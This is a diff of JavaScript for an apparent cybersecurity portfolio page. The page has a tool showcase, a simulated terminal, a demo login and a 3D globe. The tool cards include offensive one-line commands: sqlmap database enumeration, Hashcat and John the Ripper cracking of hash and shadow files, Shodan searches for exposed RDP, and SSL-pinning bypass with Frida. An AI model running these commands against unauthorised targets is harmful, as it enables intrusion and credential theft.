+  ['Zeek','gr','Network security monitor that turns traffic into rich, queryable logs (conn.log, dns.log, http.log).','zeekctl deploy && cat logs/current/conn.log'],
+  ['Suricata','rd','IDS/IPS engine — signature + anomaly detection on live traffic, Suricata rulesets from Emerging Threats.','suricata -c /etc/suricata.yaml -i eth0']]},
+ {id:'web',ico:'◉',name:'Web App',desc:'Web applications are the most attacked surface on earth. These tools intercept, fuzz and probe HTTP traffic for injection, broken auth, XSS, and misconfiguration.',tools:[
+  ['Burp Suite','gr','The industry-standard interception proxy: repeater, intruder, scanner, and extensions for everything.','burp --config=project.json  (proxy on 8080)'],
+  ['OWASP ZAP','cy','Free, open-source scanner and fuzzer — great for CI pipelines and automated baseline scans.','zap-baseline.py -t https://target.com'],
+  ['sqlmap','rd','Automated SQL injection detection and exploitation across every major DBMS.','sqlmap -u "https://t/item?id=1" --dbs --batch'],
+  ['ffuf','am','Blazing-fast web fuzzer for directories, vhosts and parameters.','ffuf -u https://target/FUZZ -w SecLists/raft-large.txt'],
+  ['Nuclei','gr','Template-based vulnerability scanner — thousands of community templates, zero false-positive noise culture.','nuclei -u https://target.com -t cves/']]},
+ {id:'cloud',ico:'☁',name:'Cloud',desc:'Cloud security is identity + configuration. One public S3 bucket or one over-privileged role can hand over the whole estate. Audit posture, simulate attacks, scan infrastructure-as-code.',tools:[
+  ['Prowler','gr','Hundreds of security checks across AWS/Azure/GCP mapped to CIS benchmarks — instant posture report.','prowler aws --compliance cis_2.0'],
+  ['ScoutSuite','cy','Multi-cloud security auditing — visualizes risky configs across accounts and services.','scout aws --profile audit-role'],
+  ['Pacu','rd','The AWS exploitation framework — simulates real attacker paths (IAM privesc, lambda abuse).','pacu> run iam__privesc_scan'],
+  ['CloudSploit','am','Scans cloud accounts for misconfigurations and security best-practice violations.','cloudsploit --json results.json'],
+  ['Trivy','gr','Scans IaC (Terraform), container images and dependency manifests for known weaknesses.','trivy config ./terraform/']]},
+ {id:'ep',ico:'▣',name:'Endpoint',desc:'Endpoints are where breaches execute. Collect rich telemetry (processes, registry, network connections), detect deviations from baseline, and hunt with queries instead of guesses.',tools:[
+  ['Sysmon','gr','Microsoft\u2019s deep endpoint telemetry: process creation, network connects, image loads — the SIEM\u2019s best friend.','sysmon -accepteula -c sysmonconfig.xml'],
+  ['osquery','cy','SQL over your entire fleet — query processes, users, startup items like a database.','osqueryi "SELECT name,path FROM startup_items"'],
+  ['Velociraptor','am','Fleet-wide DFIR: live response, artifact collection and continuous monitoring at scale.','velociraptor gui'],
+  ['YARA','rd','Pattern-matching engine for malware hunting — write rules, sweep thousands of hosts.','yara -r rules/backdoors.yar /mnt/evidence'],
+  ['ClamAV','gr','Open-source antivirus engine for mail gateways, file servers and quick triage.','clamscan -r --infected /home/']]},
+ {id:'cry',ico:'✱',name:'Crypto',desc:'Cryptography protects data at rest, in transit, and proves identity. Understand hashing vs encryption vs encoding — and how weak passwords fall to offline cracking.',tools:[
+  ['Hashcat','rd','World\u2019s fastest password recovery — GPU-accelerated cracking of 350+ hash types.','hashcat -m 1000 hashes.txt rockyou.txt -a 0'],
+  ['John the Ripper','am','Classic cracker with smart wordlist mangling rules; great for audit engagements.','john --wordlist=rockyou.txt --rules shadow.bak'],
+  ['OpenSSL','gr','The crypto Swiss army knife: certs, TLS testing, symmetric/asymmetric operations.','openssl s_client -connect target:443 -tls1_2'],
+  ['CyberChef','cy','Browser-based encode/decode/decrypt recipes — the analyst\u2019s daily driver for obfuscation.','gchq.github.io/CyberChef  (Magic operation)'],
+  ['GPG','gr','Signing and encrypting files/email — the basis of code signing and secure coms.','gpg --encrypt --recipient sec@ops file.tar']]},
+ {id:'soc',ico:'◎',name:'SOC / SIEM',desc:'The SOC is where telemetry becomes decisions. Aggregate logs, correlate events, alert on patterns, and manage incidents end-to-end. This is the blue-team command center.',tools:[
+  ['Splunk','gr','Enterprise SIEM — SPL queries across every log source, dashboards, SOAR playbooks.','index=windows EventCode=4625 | stats count by src_ip'],
+  ['Elastic SIEM','cy','Open detection & response on the Elastic stack — timelines, ML jobs, rule tuning.','kql: event.category:authentication AND event.outcome:failure'],
+  ['Wazuh','gr','Free XDR/SIEM: file integrity, vuln detection, compliance — full agent fleet.','wazuh-control status'],
+  ['TheHive','am','Incident response platform — cases, observables, tasks, integrated with MISP.','thehive: create case → import IOCs from MISP'],
+  ['MISP','rd','Threat-intel sharing platform: IOCs, galaxies, taxonomies synced between defenders.','misp: push event → tag: tlp:amber']]},
+ {id:'osi',ico:'✜',name:'OSINT',desc:'Open-source intelligence: everything an attacker learns about you from public data — and what a defender learns about attackers. Recon is legal when it\u2019s passive and public.',tools:[
+  ['Maltego','gr','Link-analysis engine connecting people, domains, IPs and orgs into visual attack-surface graphs.','maltego: transform → footprint L1 on domain'],
+  ['theHarvester','cy','Emails, subdomains, employee names from public sources — first 10 minutes of any recon.','theHarvester -d target.com -b all'],
+  ['Shodan','rd','Search engine for internet-connected devices — find exposed RDP, cameras, ICS before attackers do.','shodan search "port:3389 country:US"'],
+  ['Recon-ng','am','Modular recon framework — marketplace of modules mimicking Metasploit\u2019s workflow.','recon-ng> marketplace install recon/domains-hosts/*'],
+  ['Sherlock','cy','Hunt usernames across 400+ social networks — key for brand impersonation checks.','sherlock username --output report.txt']]},
+ {id:'mob',ico:'▤',name:'Mobile / IoT',desc:'Phones and embedded devices are computers with weaker defenses. Decompile APKs, hook runtime functions, extract firmware and audit the binary blobs inside.',tools:[
+  ['MobSF','gr','Automated static + dynamic analysis of Android/iOS apps — one upload, full report.','docker run -p 8000:8000 opensecurity/mobile-security-framework-mobsf'],
+  ['Frida','rd','Dynamic instrumentation toolkit — inject JS into running apps, bypass pinning, hook functions.','frida -U -f com.target.app -l hook.js'],
+  ['Objection','am','Runtime mobile exploration on top of Frida — explore app sandbox, disable SSL pinning.','objection -g com.target.app explore'],
+  ['binwalk','cy','Firmware analysis: extract filesystems from router/IoT images and hunt hardcoded secrets.','binwalk -e --extract firmware.bin'],
+  ['apktool','gr','Decompile Android apps to smali — inspect manifest, permissions, hardcoded endpoints.','apktool d target.apk -o out/']]}
+];
+const tabsEl=$('#tabs'),panEl=$('#panels');
+DOMAINS.forEach((d,i)=>{
+  const b=document.createElement('button');b.className='tab'+(i===0?' on':'');b.setAttribute('role','tab');
+  b.innerHTML='<span class="ico">'+d.ico+'</span>'+d.name;
+  b.addEventListener('click',()=>{$$('.tab').forEach(t=>t.classList.remove('on'));b.classList.add('on');
+    $$('.ars-panel').forEach(p=>p.classList.remove('on'));document.getElementById('p-'+d.id).classList.add('on');});
+  tabsEl.appendChild(b);
+  const p=document.createElement('div');p.className='ars-panel'+(i===0?' on':'');p.id='p-'+d.id;
+  p.innerHTML='<p class="ars-desc">'+d.desc+'</p><div class="tools">'+
+    d.tools.map(t=>'<div class="tool"><h4>'+t[0]+'<span class="chip '+t[1]+'">'+d.name+'</span></h4><p>'+t[2]+'</p><code>'+t[3]+'</code></div>').join('')+'</div>';
+  panEl.appendChild(p);
+});
+
+/* ══════════ CONSOLE ══════════ */
+const tOut=$('#tOut'),tIn=$('#tIn'); let hist=[],hi=0;
+function tprint(txt,cls){const d=document.createElement('div');d.className=cls||'';d.textContent=txt;tOut.appendChild(d);tOut.scrollTop=tOut.scrollHeight;return d;}
+tprint('SENTINEL//OPS terminal — type "help" to begin. All data simulated.','out-sys');
+const SK=[['RECON/OSINT',90],['NETWORK',85],['BLUE/SIEM',82],['WEB PENTEST',80],['IR/FORENSICS',78],['CLOUD',75],['CRYPTO',70],['MALWARE',65]];
+async function sha256(s){try{const b=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(s));return[...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join('');}catch(e){let h=0;for(let i=0;i<s.length;i++){h=(h*31+s.charCodeAt(i))|0;}return('x'.repeat(60)+(h>>>0).toString(16)).slice(0,64);}}
+function tDelay(ms){return new Promise(r=>setTimeout(r,RM?0:ms));}
+async function runCmd(raw){
+  const line=raw.trim(); if(!line)return;
+  tprint('operator@sentinel:~$ '+line,'out-dim'); hist.push(line);hi=hist.length;
+  const [cmd,...rest]=line.split(/\s+/); const arg=rest.join(' ');
+  switch(cmd.toLowerCase()){
+    case 'help':
+      tprint('  help        this list                story      breach summary','out-ok');
+      tprint('  skills      capability bars          tools <d>  list a domain','out-ok');
+      tprint('  scan <ip>   simulated host scan      nmap <h>   simulated port scan','out-ok');
+      tprint('  hash <txt>  live SHA-256             matrix     toggle the rain','out-ok');
+      tprint('  whoami      operator info            contact    open a channel','out-ok');
+      tprint('  sudo hireme you know what to do      clear      wipe screen','out-ok');break;
+    case 'banner':
+      tprint('  ▄▄ SENTINEL // OPS ▄▄  —  break it. read it. defend it.','out-sys');break;
+    case 'whoami':
+      tprint(CFG.name+' — '+CFG.role,'out-ok');
+      tprint('clearance: L3 operator | shell: browser-secure | uptime: always learning','out-dim');break;
+    case 'story':
+      tprint('T+00:00 attacker maps surface via Shodan + OSINT → T+06:52 macro foothold','out-am');
+      tprint('→ T+15:10 pass-the-hash to DC → T+38:22 2.3GB exfil → T+41:05 SIEM catches it','out-am');
+      tprint('→ T+47:00 contained, rebuilt, intel shared. Full version: scroll to FILE 01.','out-ok');
+      document.getElementById('story').scrollIntoView();break;
+    case 'skills':
+      SK.forEach(s=>tprint('  '+s[0].padEnd(14)+' '+'█'.repeat(Math.round(s[1]/5))+'░'.repeat(20-Math.round(s[1]/5))+' '+s[1]+'%','out-ok'));break;
+    case 'tools':{
+      const d=DOMAINS.find(x=>x.id===arg.toLowerCase()||x.name.toLowerCase()===arg.toLowerCase());
+      if(d){tprint('DOMAIN: '+d.name.toUpperCase(),'out-sys');d.tools.forEach(t=>tprint('  ▸ '+t[0]+' — '+t[2].split('.')[0],'out-ok'));}
+      else tprint('usage: tools <net|web|cloud|ep|cry|soc|osi|mob>  (or omit to list)','out-err');break;}
+    case 'scan':{
+      const ip=arg||'10.10.14.7'; tprint('initiating SYN sweep on '+ip+' …','out-sys');
+      await tDelay(400); tprint('[■■□□□□□□□□] 20% — resolving route','out-dim');
+      await tDelay(450); tprint('[■■■■■□□□□□] 50% — 3 hosts respond','out-dim');
+      await tDelay(450); tprint('[■■■■■■■■■■] 100% complete','out-dim');
+      tprint('  '+ip+'      UP   ports: 22/tcp ssh OpenSSH_8.9, 443/tcp nginx, 3389/tcp  ⚠ RDP exposed','out-am');
+      tprint('recommendation: restrict 3389 to VPN subnet, enable fail2ban on ssh','out-ok');break;}
+    case 'nmap':{
+      const h=arg||'target.corp';
+      await tDelay(300); tprint('Starting Nmap 7.95 ( simulated ) — scanning '+h,'out-sys');
+      await tDelay(500);
+      tprint('PORT      STATE  SERVICE     VERSION','out-ok');
+      tprint('22/tcp    open   ssh         OpenSSH 8.9p1','out-ok');
+      tprint('80/tcp    open   http        nginx 1.24.0','out-ok');
+      tprint('443/tcp   open   ssl/http    nginx 1.24.0','out-ok');
+      tprint('3306/tcp  open   mysql       MySQL 8.0.36  ⚠ bound to 0.0.0.0','out-am');
+      tprint('Nmap done: 1 host up — 4 open ports, 1 finding flagged','out-dim');break;}
+    case 'hash':
+      if(!arg){tprint('usage: hash <text>','out-err');}
+      else{tprint('computing SHA-256…','out-dim');await tDelay(350);tprint(await sha256(arg),'out-sys');tprint('(see FILE 06 — this is why plaintext passwords never get stored)','out-ok');}break;
+    case 'matrix': toggleMatrix(); tprint('follow the white rabbit.','out-ok');break;
+    case 'history': hist.forEach((h,i)=>tprint('  '+(i+1)+'  '+h,'out-dim'));break;
+    case 'clear': tOut.innerHTML='';break;
+    case 'contact': tprint('channel: '+CFG.email,'out-ok'); document.getElementById('contact').scrollIntoView();break;
+    case 'sudo':
+      if(arg==='hireme'){tprint('[sudo] password for recruiter: ********','out-dim');await tDelay(500);
+        tprint('ACCESS GRANTED — excellent judgment.','out-ok');await tDelay(400);
+        tprint('routing you to the secure channel…','out-sys');document.getElementById('contact').scrollIntoView();}
+      else tprint('operator is not in the sudoers file. This incident will be reported. 😉','out-err');break;
+    case 'rm': tprint('nice try. this terminal has backups.','out-err');break;
+    default: tprint('command not found: '+cmd+' — try "help"','out-err');
+  }
+}
+tIn.addEventListener('keydown',e=>{
+  if(e.key==='Enter'){runCmd(tIn.value);tIn.value='';}
+  else if(e.key==='ArrowUp'){if(hi>0)hi--;tIn.value=hist[hi]||'';e.preventDefault();}
+  else if(e.key==='ArrowDown'){if(hi<hist.length)hi++;tIn.value=hist[hi]||'';e.preventDefault();}
+});
+$('#tOut').parentElement.addEventListener('click',()=>tIn.focus());
+$$('.qcmd').forEach(b=>b.addEventListener('click',()=>{tIn.value=b.textContent;runCmd(b.textContent);tIn.value='';}));
+
+/* matrix rain */
+const mc=$('#matrix'),mx=mc.getContext('2d');let mOn=false,mIv=null,cols=[];
+function toggleMatrix(){mOn=!mOn;mc.style.display=mOn?'block':'none';
+  if(mOn&&!RM){mc.width=innerWidth;mc.height=innerHeight;cols=Array(Math.floor(mc.width/16)).fill(0);
+    mIv=setInterval(()=>{mx.fillStyle='rgba(4,7,12,.12)';mx.fillRect(0,0,mc.width,mc.height);mx.fillStyle='#45ffa1';mx.font='13px JetBrains Mono';
+      cols.forEach((y,i)=>{mx.fillText(String.fromCharCode(0x30A0+Math.random()*96),i*16,y);if(y>mc.height&&Math.random()>.975)cols[i]=0;else cols[i]=y+16;});},50);}
+  else if(!mOn){clearInterval(mIv);}}
+
+/* ══════════ LOGIN ══════════ */
+const DEMO={user:'operator',pass:'letmein2026'};
+let attempts=0,locked=false;
+const lPass=$('#lPass'),hashBox=$('#hashBox'),pMeter=$('#pMeter'),lMsg=$('#lMsg');
+$('#fillCreds').addEventListener('click',()=>{$('#lEmail').value=DEMO.user+'@sentinel.ops';lPass.value=DEMO.pass;lPass.dispatchEvent(new Event('input'));toast('DEMO CREDENTIALS LOADED');});
+lPass.addEventListener('input',async()=>{
+  const v=lPass.value;
+  if(!v){hashBox.textContent='SHA-256: awaiting input…';pMeter.className='meter';return;}
+  hashBox.textContent='SHA-256: '+await sha256(v);
+  let s=0; if(v.length>=6)s=1; if(v.length>=9&&/[A-Z]/.test(v))s=2; if(s===2&&/[0-9]/.test(v))s=3; if(s===3&&/[^A-Za-z0-9]/.test(v)||v.length>=14)s=4;
+  pMeter.className='meter s'+s;
+});
+$('#lBtn').addEventListener('click',async()=>{
+  if(locked)return;
+  const u=$('#lEmail').value.trim().split('@')[0].toLowerCase(), p=lPass.value;
+  if(!u||!p){lMsg.textContent='[!] both fields required';lMsg.className='login-msg err';return;}
+  if(u===DEMO.user&&p===DEMO.pass){
+    lMsg.textContent='[✓] hash verified — session issued';lMsg.className='login-msg ok';
+    await tDelay(RM?0:500); $('#loginForm').style.display='none'; $('#granted').classList.add('on'); toast('ACCESS GRANTED — WELCOME, OPERATOR');
+  }else{
+    attempts++; const left=5-attempts;
+    if(left<=0){locked=true;lMsg.textContent='[✕] TOO MANY ATTEMPTS — LOCKED 10s (rate limiting in action)';lMsg.className='login-msg err';
+      let t=10;const iv=setInterval(()=>{t--;lMsg.textContent='[✕] LOCKED — retry in '+t+'s';if(t<=0){clearInterval(iv);locked=false;attempts=0;lMsg.textContent='';}},1000);}
+    else{lMsg.textContent='[✕] invalid credentials — '+left+' attempt'+(left===1?'':'s')+' left (uniform errors prevent enumeration)';lMsg.className='login-msg err';}
+  }
+});
+$('#logout').addEventListener('click',()=>{$('#granted').classList.remove('on');$('#loginForm').style.display='block';lPass.value='';hashBox.textContent='SHA-256: awaiting input…';pMeter.className='meter';lMsg.textContent='';toast('SESSION TERMINATED — TOKEN REVOKED');});
+
+/* ══════════ CONTACT ══════════ */
+$('#copyMail').addEventListener('click',()=>copyTxt(CFG.email,'EMAIL COPIED — TALK SOON'));
+$('#cForm').addEventListener('submit',e=>{
+  e.preventDefault();
+  const n=$('#cName').value,f=$('#cFrom').value,b=$('#cBody').value;
+  const subject='[SENTINEL//OPS] Contact from '+n;
+  const body=b+'\n\n— '+n+'\n'+f+'\n(sent via sentinel-ops secure channel)';
+  const prev=$('#mailPrev');
+  prev.textContent='TO:      '+CFG.email+'\nSUBJECT: '+subject+'\nBODY:\n'+b;
+  prev.classList.add('on');
+  window.location.href='mailto:'+CFG.email+'?subject='+encodeURIComponent(subject)+'&body='+encodeURIComponent(body);
+  toast('TRANSMISSION COMPOSED — OPENING MAIL CLIENT');
+});
+
+/* showcase kit */
+$('#copyLi').addEventListener('click',()=>copyTxt($('#liPost').textContent,'LINKEDIN POST COPIED — NOW GO FLAUNT IT'));
+$('#copyRd').addEventListener('click',()=>copyTxt($('#rdPost').textContent,'README COPIED — PUSH IT TO GITHUB'));
+
+/* ══════════ THREE.JS GLOBE ══════════ */
+try{
+const wrap=$('#globe');
+const scene=new THREE.Scene();
+const cam=new THREE.PerspectiveCamera(45,1,.1,100); cam.position.z=3.4;
+const ren=new THREE.WebGLRenderer({alpha:true,antialias:true});
+ren.setPixelRatio(Math.min(devicePixelRatio,2)); wrap.appendChild(ren.domElement);
+function size(){const w=wrap.clientWidth,h=wrap.clientHeight;cam.aspect=w/h;cam.updateProjectionMatrix();ren.setSize(w,h);}
+size(); addEventListener('resize',size);
+const group=new THREE.Group(); scene.add(group);
+/* wire sphere */
+group.add(new THREE.Mesh(new THREE.SphereGeometry(1,36,36),new THREE.MeshBasicMaterial({color:0x1c6b45,wireframe:true,transparent:true,opacity:.34})));
+/* fibonacci points */
+const pts=[];const N=260;
+for(let i=0;i<N;i++){const y=1-(i/(N-1))*2,r=Math.sqrt(1-y*y),th=i*2.39996;pts.push(new THREE.Vector3(Math.cos(th)*r,y,Math.sin(th)*r).multiplyScalar(1.005));}
+const pGeo=new THREE.BufferGeometry().setFromPoints(pts);
+group.add(new THREE.Points(pGeo,new THREE.PointsMaterial({color:0x45ffa1,size:.02,transparent:true,opacity:.85,blending:THREE.AdditiveBlending})));
+/* outer dust shell */
+const dust=[];for(let i=0;i<380;i++){const v=new THREE.Vector3().setFromSphericalCoords(1.7+Math.random()*1.2,Math.acos(2*Math.random()-1),Math.random()*Math.PI*2);dust.push(v);}
+const dustPts=new THREE.Points(new THREE.BufferGeometry().setFromPoints(dust),new THREE.PointsMaterial({color:0x1d7a4f,size:.012,transparent:true,opacity:.5}));
+scene.add(dustPts);
+/* arcs */
+const arcs=[];
+function spawnArc(){
+  const p1=new THREE.Vector3().setFromSphericalCoords(1.02,Math.acos(2*Math.random()-1),Math.random()*Math.PI*2);
+  const p2=new THREE.Vector3().setFromSphericalCoords(1.02,Math.acos(2*Math.random()-1),Math.random()*Math.PI*2);
+  const mid=p1.clone().add(p2).multiplyScalar(.5).normalize().multiplyScalar(1+p1.distanceTo(p2)*.45);
+  const curve=new THREE.QuadraticBezierCurve3(p1,mid,p2);
+  const pts2=curve.getPoints(60);
+  const red=Math.random()<.72;
+  const line=new THREE.Line(new THREE.BufferGeometry().setFromPoints(pts2),
+    new THREE.LineBasicMaterial({color:red?0xff4d5e:0x45ffa1,transparent:true,opacity:red?.75:.9}));
+  line.geometry.setDrawRange(0,0);
+  group.add(line); arcs.push({line,total:61,t:0});
+}
+for(let i=0;i<7;i++){spawnArc();arcs[arcs.length-1].t=Math.random();}
+let mx=0,my=0;
+wrap.parentElement.addEventListener('mousemove',e=>{mx=(e.clientX/innerWidth-.5);my=(e.clientY/innerHeight-.5);});
+let last=0;
+function loop(ts){
+  requestAnimationFrame(loop);
+  if(RM){ren.render(scene,cam);return;}
+  group.rotation.y+=.0016; dustPts.rotation.y-=.0004;
+  group.rotation.x+=((my*.25)-group.rotation.x)*.04;
+  cam.position.x+=((mx*.5)-cam.position.x)*.04; cam.lookAt(0,0,0);
+  arcs.forEach(a=>{a.t+=.012;const draw=Math.min(a.total,Math.floor(a.t*1.6*a.total/ a.total *a.total* (a.t<1? a.t:1)));
+    a.line.geometry.setDrawRange(0,Math.min(a.total,Math.floor(Math.min(a.t,1)*a.total)));
+    if(a.t>1.5)a.line.material.opacity-=.03;
+    if(a.line.material.opacity<=0){group.remove(a.line);a.dead=true;}});
+  for(let i=arcs.length-1;i>=0;i--)if(arcs[i].dead)arcs.splice(i,1);
+  if(ts-last>700&&arcs.length<16&&!document.hidden){spawnArc();last=ts;}
+  ren.render(scene,cam);
+}
+requestAnimationFrame(loop);
+if(RM){arcs.forEach(a=>a.line.geometry.setDrawRange(0,a.total));ren.render(scene,cam);}
+}catch(e){console.warn('3D globe unavailable:',e);}
+})();
+</script>
+</body>
+</html>
